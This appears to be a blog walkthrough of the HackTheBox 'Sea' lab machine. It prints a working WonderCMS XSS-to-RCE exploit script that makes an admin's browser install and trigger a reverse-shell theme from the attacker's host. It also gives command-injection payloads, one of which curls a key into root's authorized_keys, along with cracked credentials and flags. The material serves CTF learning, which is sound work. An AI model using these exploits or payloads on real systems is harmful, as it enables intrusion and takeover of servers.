---
title: Sea
date: 2025-05-18
description: Detailed walkthrough of the Sea room on HackTheBox platform, covering initial enumeration, exploiting vulnerabilities, and obtaining user and root flags.
draft: false
hideToc: false
enableToc: true
enableTocContent: true
author: g4nd1v
authorEmoji: 👨‍💻
tags:
  - HackTheBox
  - htb-sea
  - feroxbuster
  - wondercms
  - cve-2023-41425
  - xss
  - reverse-shell
  - hashcat
  - file-read
  - command-injection
  - linpeas
  - ssh
  - tunneling
  - privilege-escalation
categories:
  - HackTheBox
  - HackTheBox/Linux
image: images/Sea/banner.jpeg
---

# Sea

| Title       | [Sea](https://app.hackthebox.com/machines/620)                                                                                                            |
| ----------- | --------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Description | Detailed walkthrough of the Sea room on HackTheBox platform, covering initial enumeration, exploiting vulnerabilities, and obtaining user and root flags. |
| Difficulty  | Easy                                                                                                                                                      |
| Maker       | [FisMatHack](https://app.hackthebox.com/users/1076236)                                                                                                    |

## Enumeration

### Nmap

```bash
└─$ cat nmap/tcp_default.nmap
# Nmap 7.95 scan initiated Sun May 18 16:49:14 2025 as: /usr/lib/nmap/nmap -sCV -T4 --min-rate 10000 -p- -v -oA nmap/tcp_default 10.10.11.28
Nmap scan report for sea.htb (10.10.11.28)
Host is up (0.086s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 e3:54:e0:72:20:3c:01:42:93:d1:66:9d:90:0c:ab:e8 (RSA)
|   256 f3:24:4b:08:aa:51:9d:56:15:3d:67:56:74:7c:20:38 (ECDSA)
|_  256 30:b1:05:c6:41:50:ff:22:a3:7f:41:06:0e:67:fd:50 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-methods:
|_  Supported Methods: GET POST OPTIONS
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

So from the Nmap, we can see there are 2 ports running, ssh and http. The first thing I have tried was to visit the website, but there is nothing in website except the contact form.
![[Pasted image 20250518171520.png]]
But this page is not giving anything, no SSRF, or XSS. Also, it seems the website is written in PHP as it is having `contact.php` page. Next, on fuzzing the directory I have found `themes/` directory and from that directory, I got the theme name, license and version of the theme.
![[Pasted image 20250518171836.png]]Next, I googled about the theme name and it's version, I have found it's `WonderCMS` and there is exploit available for this - https://www.exploit-db.com/exploits/52271

## User Flag

We can use this exploit (https://gist.github.com/prodigiousMind/fc69a79629c4ba9ee88a7ad526043413).

1. It takes 3 arguments: - URL: where WonderCMS is installed (no need to know the password) - IP: attacker's Machine IP - Port No: attacker's Machine PORT
   Changing the script from the original exploit.

- changed pathname to hostname
- downloaded main.zip from https://github.com/prodigiousMind/revshell/archive/refs/heads/main.zip to locally.

```js
# Exploit: WonderCMS XSS to RCE
import sys
import requests
import os
import bs4

if (len(sys.argv)<4): print("usage: python3 exploit.py loginURL IP_Address Port\nexample: python3 exploit.py http://localhost/wondercms/loginURL 192.168.29.165 5252")
else:
  data = '''
var url = "'''+str(sys.argv[1])+'''";
if (url.endsWith("/")) {
 url = url.slice(0, -1);
}
var urlWithoutLog = url.split("/").slice(0, -1).join("/");
var urlWithoutLogBase = new URL(urlWithoutLog).hostname;
var token = document.querySelectorAll('[name="token"]')[0].value;
var urlRev = urlWithoutLogBase+"/?installModule=http://10.10.14.16:8000/main.zip&directoryName=violet&type=themes&token=" + token;
var xhr3 = new XMLHttpRequest();
xhr3.withCredentials = true;
xhr3.open("GET", urlRev);
xhr3.send();
xhr3.onload = function() {
 if (xhr3.status == 200) {
   var xhr4 = new XMLHttpRequest();
   xhr4.withCredentials = true;
   xhr4.open("GET", urlWithoutLogBase+"/themes/revshell-main/rev.php");
   xhr4.send();
   xhr4.onload = function() {
     if (xhr4.status == 200) {
       var ip = "'''+str(sys.argv[2])+'''";
       var port = "'''+str(sys.argv[3])+'''";
       var xhr5 = new XMLHttpRequest();
       xhr5.withCredentials = true;
       xhr5.open("GET", urlWithoutLogBase+"/themes/revshell-main/rev.php?lhost=" + ip + "&lport=" + port);
       xhr5.send();

     }
   };
 }
};
'''
  try:
    open("xss.js","w").write(data)
    print("[+] xss.js is created")
    print("[+] execute the below command in another terminal\n\n----------------------------\nnc -lvp "+str(sys.argv[3]))
    print("----------------------------\n")
    XSSlink = str(sys.argv[1]).replace("loginURL","index.php?page=loginURL?")+"\"></form><script+src=\"http://"+str(sys.argv[2])+":8000/xss.js\"></script><form+action=\""
    XSSlink = XSSlink.strip(" ")
    print("send the below link to admin:\n\n----------------------------\n"+XSSlink)
    print("----------------------------\n")

    print("\nstarting HTTP server to allow the access to xss.js")
    os.system("python3 -m http.server\n")
  except: print(data,"\n","//write this to a file")

```

1. It generates an xss.js file (for reflected XSS) and outputs a malicious link.
   ![[Pasted image 20250520151750.png]]
2. As soon as the admin (logged user) opens/clicks the malicious link, a few background requests are made without admin acknowledgement to upload a shell via the upload theme/plugin functionality.
   ![[Pasted image 20250520151807.png]]
3. After uploading the shell, it executes the shell and the attacker gets the reverse connection of the server. As the shell is uploaded on this path, on visiting this path we will get the shell: `curl 'http://sea.htb/themes/revshell-main/rev.php?lhost=10.10.14.16&&lport=4444'`
   ![[Pasted image 20250520151841.png]]
   If we go to `/var/www/sea/data` folder, we will `database.js` file and in that file we will get password.
   ![[Pasted image 20250520152524.png]]
   Removing that `\` from the password we will get `$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ/D.GuE4jRIikYiWrD3TM/PjDnXm4q` and we can crack the password using john.
   ![[Pasted image 20250520152625.png]]
   Password is: `mychemicalromance`
   Now, if we check the home directory in our rev shell, we can see we have 2 users. That is, `amay` and `geo`. Let's try to use this password in ssh with this usernames.
   We got user shell using,

| User | Pass              |
| ---- | ----------------- |
| amay | mychemicalromance |

> User Flag: `54970052ef7c36482285d18e365f7f71`

## Root Flag

After we got our user, I have downloaded [linpeas](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS) and ran it in ssh shell.
![[Pasted image 20250520153412.png]]
In Active ports tab, we can see there is an unusual port `8080` that is open, let's see what is hosted on that port - `ssh -L 8080:localhost:8080 amay@sea.htb`. On visiting the website, it will ask for username and password, as of now we only have one! Let's try that
![[Pasted image 20250520154503.png]]
And it worked!
![[Pasted image 20250520154603.png]]
It seems we can able to see the logs, maybe log poisoning or LFI? Let's see!
After trying certain payload, I can verify it is having command injection vulnerability.
If we send this payload `log_file=;id+#&analyze_log=` we will get command injection. Let's get the keys from root using this technique.
If we use this payload `log_file=;ls+/root/.ssh/+#&analyze_log=` we can see there is `authorized_key` in response.
![[Pasted image 20250520161015.png]]
What I will do is, generate a keypair locally and the upload the key to authorized key and we will login using private key.

- To upload the key using curl: `log_file=;curl+http://10.10.14.16:8000/key.pub+>>/root/.ssh/authorized_keys+#&analyze_log=`
- Next login to `root` using ssh using the key we have generated: `ssh -i key root@sea.htb`
  > Root Flag: `3df2005ae45ed6ab5cf74f83b6f68416`
